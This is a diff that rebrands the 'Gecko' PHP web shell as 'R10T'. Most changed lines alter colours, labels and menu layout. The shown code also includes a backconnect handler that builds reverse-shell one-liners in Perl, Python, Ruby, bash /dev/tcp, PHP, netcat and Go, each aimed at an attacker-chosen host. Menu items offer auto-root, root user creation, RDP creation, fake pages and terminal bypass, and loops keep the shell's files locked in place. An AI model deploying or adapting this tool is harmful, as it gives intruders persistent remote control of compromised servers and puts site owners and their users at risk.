@@ -43,8 +43,8 @@ function login_shell()
             input[type=submit] {
                 border: none;
                 padding: 4.5px 20px;
-                background-color: #2e313d;
-                color: #fff
+                background-color: #010d40;
+                color: #ddcf02
             }
         </style>
     </head>
@@ -145,7 +145,7 @@ if ($_GET['don'] == true) {
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Gecko [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
+    <title>R10T [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
     <script src='https://kit.fontawesome.com/057b9b510c.js' crossorigin='anonymous'></script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
     <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
@@ -153,18 +153,18 @@ if ($_GET['don'] == true) {
         .btn-submit,
         a {
             text-decoration: none;
-            color: #fff
+            color: #ddcf02
         }
 
         a,
         body {
-            color: #fff
+            color: #ddcf02
         }
 
         .btn-submit,
         .form-file,
         tbody tr:nth-child(2n) {
-            background-color: #22242d
+            background-color: #31009d
         }
 
         .code-editor,
@@ -192,7 +192,7 @@ if ($_GET['don'] == true) {
         }
 
         body {
-            background-color: #0e0f17;
+            background-color: #000e28;
             font-family: monospace
         }
 
@@ -201,7 +201,7 @@ if ($_GET['don'] == true) {
         .menu-file-manager ul,
         .path-pwd,
         thead {
-            background-color: #2e313d
+            background-color: #010d40
         }
 
         ul {
@@ -218,9 +218,9 @@ if ($_GET['don'] == true) {
         }
 
         .btn-submit {
-            padding: 7px 25px;
+            padding: 5px 10px;
             border: 2px solid grey;
-            border-radius: 4px
+            border-radius: 10px
         }
 
         .form-file,
@@ -263,7 +263,7 @@ if ($_GET['don'] == true) {
         .menu-file-manager li a::after {
             content: "";
             display: block;
-            border-bottom: 1px solid #fff
+            border-bottom: 1px solid #ddcf02
         }
 
         .path-pwd {
@@ -294,11 +294,11 @@ if ($_GET['don'] == true) {
         }
 
         ::-webkit-scrollbar-track {
-            background: #0e0f17
+            background: #000e28
         }
 
         ::-webkit-scrollbar-thumb {
-            background: #22242d;
+            background: #750000;
             border: 2px solid #555;
             border-radius: 4px
         }
@@ -357,7 +357,7 @@ if ($_GET['don'] == true) {
             border: none;
             border-radius: 4px;
             box-shadow: 8px 8px 20px rgba(0, 0, 0, .2);
-            border-bottom: 2px solid #0e0f17
+            border-bottom: 2px solid #000e28
         }
 
         .box-shadow {
@@ -365,8 +365,8 @@ if ($_GET['don'] == true) {
         }
 
         .btn-modal-close {
-            background-color: #22242d;
-            color: #fff;
+            background-color: #750000;
+            color: #ddcf02;
             border: none;
             border-radius: 4px;
             padding: 8px 35px
@@ -378,7 +378,7 @@ if ($_GET['don'] == true) {
             padding: 5px;
             border-radius: 5px;
             margin-left: 110px;
-            background-color: #2e313d
+            background-color: #010d40
         }
 
         .modal-btn-form {
@@ -464,8 +464,8 @@ if ($_GET['don'] == true) {
         .code-editor-body textarea {
             border-radius: 4px;
             margin: 0 4px;
-            background-color: #22242d;
-            color: #fff
+            background-color: #750000;
+            color: #ddcf02
         }
 
         .terminal-container {
@@ -477,11 +477,11 @@ if ($_GET['don'] == true) {
             border-radius: 4px
         }
 
-        .bc-gecko,
+        .bc-R10T,
         .mail,
         .terminal-input {
-            background-color: #22242d;
-            color: #fff
+            background-color: #000e28;
+            color: #ddcf02
         }
 
         .terminal-head {
@@ -501,7 +501,7 @@ if ($_GET['don'] == true) {
 
         .terminal-body textarea {
             margin: 4px;
-            background-color: #22242d;
+            background-color: #000e28;
             color: #29db12;
             border-radius: 4px
         }
@@ -513,12 +513,12 @@ if ($_GET['don'] == true) {
         .terminal-input {
             width: 500px;
             padding: 6px;
-            border: 1px solid #22242d;
+            border: 1px solid #000e28;
             border-radius: 4px;
             margin: 5px 0
         }
 
-        .bc-gecko {
+        .bc-R10T {
             border: none;
             padding: 7px 10px;
             width: 712px;
@@ -532,7 +532,7 @@ if ($_GET['don'] == true) {
             height: 100px
         }
 
-        .logo-gecko {
+        .logo-R10T {
             position: absolute;
             top: -90px;
             right: 40px;
@@ -551,32 +551,43 @@ if ($_GET['don'] == true) {
             <li><i class="fa-solid fa-globe"></i>&nbsp;<?= s(); ?></li>
             <li><i class="fa-brands fa-php"></i>&nbsp;<?= PHP_VERSION; ?></li>
             <li><i class="fa-solid fa-user"></i>&nbsp;<?= $fungsi[9](); ?></li>
-            <li class="logo-gecko"><img width="400" height="400" src="https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko1.png" align="right"></li>
+            <li class="logo-R10T"><img width="400" height="400" src="https://iappleunlock.xyz/image/logobiru.png" align="right"></li>
             <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
-                <li class="form-upload"><input type="submit" value="Upload" name="gecko-up-submit" class="btn-submit">&nbsp;<input type="file" name="gecko-upload" class="form-file"></li>
+            <li class="form-upload"><input type="submit" value="Upload" name="R10T-up-submit" class="btn-submit">&nbsp;<input type="file" name="R10T-upload"></li>
             </form>
         </ul>
     </div>
     <div class="menu-tools">
         <ul>
+            <li><a href=" " class="btn-submit" id="create_folder">Create Folder</a></li>
+            <li><a href=" " class="btn-submit" id="create_file">Create File</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal" class="btn-submit">Terminal</a></li>
-            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=root" class="btn-submit badge-root">AUTO ROOT</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=root" class="btn-submit">AUTO ROOT [ROOT]</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&adminer" class="btn-submit">Adminer</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&destroy" class="btn-submit">Backdoor Destroyer</a></li>
             <li><a href="//www.exploit-db.com/search?q=Linux%20Kernel%20<?= suggest_exploit(); ?>" class="btn-submit">Linux Exploit</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&lockshell" class="btn-submit">Lock Shell</a></li>
-            <li><a href="" class="btn-submit badge-linux" id="lock-file">Lock File</a></li>
-            <li><a href="" class="btn-submit badge-root" id="root-user">Create User</a></li>
+            <li><a href="" class="btn-submit" id="lock-file">Lock File Linux</a></li>
+            <li><a href="" class="btn-submit" id="root-user">Create User [ROOT]</a></li>
             <li><a href="" class="btn-submit" id="create-rdp">CREATE RDP</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&mailer" class="btn-submit">PHP Mailer</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&fakepage" class="btn-submit">FAKE PAGE</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&backconnect" class="btn-submit">BACKCONNECT</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=bypasser" class="btn-submit">TERMINAL BYPASSER</a></li>
             <li><a href="//hashes.com/en/tools/hash_identifier" class="btn-submit">HASH IDENTIFIER</a></li>
-            <li><a href="" class="btn-submit badge-windows" id="lock-windows">Lock File</a></li>
+            <li><a href="" class="btn-submit" id="lock-windows">Lock File Windows</a></li>
             <li><a href="//github.com/MadExploits/" class="btn-submit">README</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&logout=True" class="btn-submit">LOGOUT!</a></li>
+            <li>
+        <select name="R10T-select" class="btn-submit">
+            <option value="delete">Delete</option>
+            <option value="unzip">Unzip</option>
+            <option value="zip">Zip</option><br>
+        </select>
+        <input type="submit" name="submit-action" value="Submit" class="btn-submit" style="padding: 5px 20px;">
+        </form>
         </ul>
+        </li>
     </div>
 
     <?php
@@ -586,10 +597,6 @@ if ($_GET['don'] == true) {
     ?>
 
     <div class="menu-file-manager">
-        <ul>
-            <li><a href="" id="create_folder">+ Create Folder</a></li>
-            <li><a href="" id="create_file">+ Create File</a></li>
-        </ul>
         <div class="path-pwd">
             <?php
             $cwd = str_replace("\\", "/", $get_cwd); // untuk dir garis windows
@@ -614,7 +621,9 @@ if ($_GET['don'] == true) {
             ?>
         </div>
         </ul>
+        
         <table style="width: 100%;">
+        
             <thead>
                 <tr>
                     <th>Name</th>
@@ -622,10 +631,9 @@ if ($_GET['don'] == true) {
                     <th>Permission</th>
                     <th>Action</th>
                 </tr>
-            </thead>
             <form action="" method="post">
                 <tbody>
-                    <!-- Gecko Folder File Manager -->
+                    <!-- R10T Folder File Manager -->
                     <?php foreach ($file_manager as $_D) : ?>
                         <?php if ($fungsi[2]($_D)) : ?>
                             <tr>
@@ -645,11 +653,11 @@ if ($_GET['don'] == true) {
                             </tr>
                         <?php endif; ?>
                     <?php endforeach; ?>
-                    <!-- Gecko Files Manager -->
+                    <!-- R10T Files Manager -->
                     <?php foreach ($file_manager as $_F) : ?>
                         <?php if ($fungsi[3]($_F)) : ?>
                             <tr>
-                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<i class="fa-solid fa-file-lines"></i>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="gecko-files"><?= namaPanjang($_F); ?></a></td>
+                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<i class="fa-solid fa-file-lines"></i>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="R10T-files"><?= namaPanjang($_F); ?></a></td>
                                 <td><?= formatSize(filesize($_F)); ?></td>
                                 <td>
                                     <?php if (is_writable($fungsi[0]() . '/' . $_D)) {
@@ -667,14 +675,7 @@ if ($_GET['don'] == true) {
                     <?php endforeach; ?>
                 </tbody>
         </table>
-        <br>
-        <select name="gecko-select" class="btn-submit">
-            <option value="delete">Delete</option>
-            <option value="unzip">Unzip</option>
-            <option value="zip">Zip</option><br>
-        </select>
-        <input type="submit" name="submit-action" value="Submit" class="btn-submit" style="padding: 8.3px 35px;">
-        </form>
+
 
         <!-- Modal Pop Jquery Create Folder/File By ./MrMad -->
         <div class="modal">
@@ -702,7 +703,7 @@ if ($_GET['don'] == true) {
                 </div>
                 <form action="" method="post">
                     <div class="modal-body">
-                        <select class="bc-gecko box-shadow" name="gecko-bc">
+                        <select class="bc-R10T box-shadow" name="R10T-bc">
                             <option value="-">Choose Backconnect</option>
                             <option value="perl">Perl</option>
                             <option value="python">Python</option>
@@ -988,23 +989,23 @@ if ($_GET['don'] == true) {
 if (isset($_POST['submit-bc'])) {
     $HostServer = $_POST['backconnect-host'];
     $PortServer = $_POST['backconnect-port'];
-    if ($_POST['gecko-bc'] == "perl") {
+    if ($_POST['R10T-bc'] == "perl") {
         echo cmd('perl -e \'use Socket;$i="' . $HostServer . '";$p=' . $PortServer . ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'');
-    } else if ($_POST['gecko-bc'] == "python") {
+    } else if ($_POST['R10T-bc'] == "python") {
         echo cmd('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' . $HostServer . '",' . $PortServer . '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
-    } else if ($_POST['gecko-bc'] == "ruby") {
+    } else if ($_POST['R10T-bc'] == "ruby") {
         echo cmd('ruby -rsocket -e\'f=TCPSocket.open("' . $HostServer . '",' . $PortServer . ').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'');
-    } else if ($_POST['gecko-bc'] == "bash") {
+    } else if ($_POST['R10T-bc'] == "bash") {
         echo cmd('bash -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
-    } else if ($_POST['gecko-bc'] == "php") {
+    } else if ($_POST['R10T-bc'] == "php") {
         echo cmd('php -r \'$sock=fsockopen("' . $HostServer . '",' . $PortServer . ');exec("/bin/sh -i <&3 >&3 2>&3");\'');
-    } else if ($_POST['gecko-bc'] == "nc") {
+    } else if ($_POST['R10T-bc'] == "nc") {
         echo cmd('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' . $HostServer . ' ' . $PortServer . ' >/tmp/f');
-    } else if ($_POST['gecko-bc'] == "sh") {
+    } else if ($_POST['R10T-bc'] == "sh") {
         echo cmd('sh -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
-    } else if ($_POST['gecko-bc'] == "xterm") {
+    } else if ($_POST['R10T-bc'] == "xterm") {
         echo cmd('xterm -display ' . $HostServer . ':' . $PortServer);
-    } else if ($_POST['gecko-bc'] == "golang") {
+    } else if ($_POST['R10T-bc'] == "golang") {
         echo cmd('echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","' . $HostServer . ':' . $PortServer . '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go');
     }
 }
@@ -1132,15 +1133,15 @@ if (isset($_GET['lockshell'])) {
 		$text = base64_encode(file_get_contents("' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($curFile) . '-text') . '"));
 		file_put_contents("' . $fungsi[0]() . '/' . $curFile . '", base64_decode($text));
 	    }
-	    if (gecko_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
+	    if (R10T_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
 		chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
 	    }
-	    if (gecko_perm("' . __DIR__ . '") != 0555){
+	    if (R10T_perm("' . __DIR__ . '") != 0555){
 		chmod("' . __DIR__ . '", 0555);
 	    }
 	}
 
-function gecko_perm($flename){
+function R10T_perm($flename){
 return substr(sprintf("%o", fileperms($flename)), -4);
 	}
 	';
@@ -1152,9 +1153,9 @@ return substr(sprintf("%o", fileperms($flename)), -4);
 		failed();
 	    }
 	}
-	if (isset($_POST['gecko-up-submit'])) {
-	    $namaFilenya = $_FILES['gecko-upload']['name'];
-	    $tmpName = $_FILES['gecko-upload']['tmp_name'];
+	if (isset($_POST['R10T-up-submit'])) {
+	    $namaFilenya = $_FILES['R10T-upload']['name'];
+	    $tmpName = $_FILES['R10T-upload']['tmp_name'];
 	    if ($fungsi[29]($tmpName, $fungsi[0]() . "/" . $namaFilenya)) {
 		success();
 	    } else {
@@ -1223,7 +1224,7 @@ if ($_GET['terminal'] == "root") {
 
 if (isset($_POST['submit-action'])) {
     $items = $_POST['check'];
-    if ($_POST['gecko-select'] == "delete") {
+    if ($_POST['R10T-select'] == "delete") {
         foreach ($items as $it) {
             $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
             $fd = $repl . "/" . $it;
@@ -1309,15 +1310,15 @@ while (True){
         $text = base64_encode(file_get_contents("' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-text-file') . '"));
         file_put_contents("' . $fungsi[0]() . '/' . $flesName . '", base64_decode($text));
     }
-    if (gecko_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
+    if (R10T_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
         chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
     } 
-    if (gecko_perm("' . $fungsi[0]() . '") != 0555){
+    if (R10T_perm("' . $fungsi[0]() . '") != 0555){
         chmod("' . $fungsi[0]() . '", 0555);
     }
 }
 
-function gecko_perm($flename){
+function R10T_perm($flename){
     return substr(sprintf("%o", fileperms($flename)), -4);
 }
 ';
@@ -1348,12 +1349,12 @@ while (True){
         $text = base64_encode(file_get_contents("' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-text-file') . '"));
         file_put_contents("' . $fungsi[0]() . '/' . $flesName . '", base64_decode($text));
     }
-    if (gecko_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
+    if (R10T_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
         chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
     }
 }
 
-function gecko_perm($flename){
+function R10T_perm($flename){
     return substr(sprintf("%o", fileperms($flename)), -4);
 }
 ';
@@ -1391,16 +1392,16 @@ while (True)
         $target = "' . winpwd() . '/' . $NameWin . '";
         file_put_contents($target, base64_decode($text));
     }
-    if (gecko_perm("' . winpwd() . '/' . $NameWin . '") != 0444){
+    if (R10T_perm("' . winpwd() . '/' . $NameWin . '") != 0444){
         chmod("' . winpwd() . '/' . $NameWin . '", 0444);
     }
-    if (gecko_perm("' . winpwd() . '") != 0444){
+    if (R10T_perm("' . winpwd() . '") != 0444){
         chmod("' . winpwd() . '", 0444);
     }
     
 }
 
-function gecko_perm($flename)
+function R10T_perm($flename)
 {
     return substr(sprintf("%o", fileperms($flename)), -4);
 }
@@ -1459,7 +1460,7 @@ Swal.fire({
     icon: 'success',
     title: 'Sucesss...',
     text: 'Done Success!',
-    confirmButtonColor: '#22242d',
+    confirmButtonColor: '#750000',
 })</script>";
 } else if ($_GET['response'] == "failed") {
     echo "<script>
@@ -1467,7 +1468,7 @@ Swal.fire({
     icon: 'error',
     title: 'Failed...',
     text: 'Something wrong!',
-    confirmButtonColor: '#22242d',
+    confirmButtonColor: '#750000',
 })
     </script>";
 }
